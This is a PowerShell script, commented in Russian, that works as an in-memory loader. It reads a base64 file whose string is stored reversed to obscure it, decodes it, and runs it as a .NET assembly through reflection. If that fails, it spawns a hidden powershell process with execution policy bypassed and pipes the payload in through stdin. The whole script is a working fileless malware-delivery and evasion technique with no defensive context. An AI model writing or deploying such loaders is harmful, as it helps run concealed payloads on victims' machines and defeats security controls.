﻿# Путь к base64-файлу
$path = "base64.txt"

# Читаем и переворачиваем строку
$base64 = Get-Content -Path $path -Raw
$chars = $base64.ToCharArray()
[Array]::Reverse($chars)
$fixedBase64 = -join $chars

# Декодируем в байты
$bytes = [Convert]::FromBase64String($fixedBase64)

function Invoke-Assembly {
    param([byte[]]$Bytes)

    try {
        $asm = [System.Reflection.Assembly]::Load($Bytes)
        $entry = $asm.EntryPoint
        if (-not $entry) { return $false }

        $instance = if ($entry.IsStatic) { $null } else { New-Object $entry.DeclaringType }

        $paramCount = $entry.GetParameters().Count
        switch ($paramCount) {
            0 { $argsToPass = @() }
            1 { $argsToPass = @( ,([string[]]@()) ) }
            default { return $false }
        }

        $entry.Invoke($instance, $argsToPass) | Out-Null
        return $true
    }
    catch {
        return $false
    }
}

if (-not (Invoke-Assembly -Bytes $bytes)) {
    # fallback: передаём exe в новый процесс через stdin
    $encoded = [Convert]::ToBase64String($bytes)
    $psCmd = @'
$in = [Console]::In.ReadToEnd()
$bytes = [Convert]::FromBase64String($in)
$asm = [System.Reflection.Assembly]::Load($bytes)
$entry = $asm.EntryPoint
if ($entry) {
    $instance = if ($entry.IsStatic) { $null } else { New-Object $entry.DeclaringType }
    if ($entry.GetParameters().Count -eq 0) {
        $entry.Invoke($instance, @())
    } else {
        $entry.Invoke($instance, @( ,([string[]]@()) ))
    }
}
'@

    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "powershell"
    $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command -"
    $psi.UseShellExecute = $false
    $psi.RedirectStandardInput = $true
    $proc = [System.Diagnostics.Process]::Start($psi)

    $proc.StandardInput.WriteLine($encoded)
    $proc.StandardInput.Close()
}
